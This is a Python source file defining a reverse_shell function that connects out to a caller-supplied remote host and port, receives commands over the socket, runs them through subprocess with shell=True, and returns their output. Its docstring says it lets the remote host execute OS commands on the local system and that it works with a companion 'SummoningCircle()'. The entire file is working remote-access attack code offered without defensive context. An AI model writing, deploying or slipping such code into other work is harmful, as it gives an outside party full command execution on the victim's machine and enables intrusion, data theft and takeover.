import socket
from subprocess import run


def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -> None:
    """
    Opens a connection to a remote host.
    Allows remote host to execute OS commands on local system.

    Works with SummoningCircle().
    """

    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((remote_host, remote_port))

    while True:
        # receive the command from the server
        command = s.recv(buffer_size).decode().split()

        if command[0].lower() == "exit":
            # if the command is exit, just break out of the loop
            break

        try:
            os_call = run(command, shell=True, capture_output=True)

            if os_call.returncode == 0:
                s.send(os_call.stdout)
            else:
                s.send(os_call.stderr)
        except FileNotFoundError:
            s.send(b"Error occurred.")

    # close client connection
    s.close()
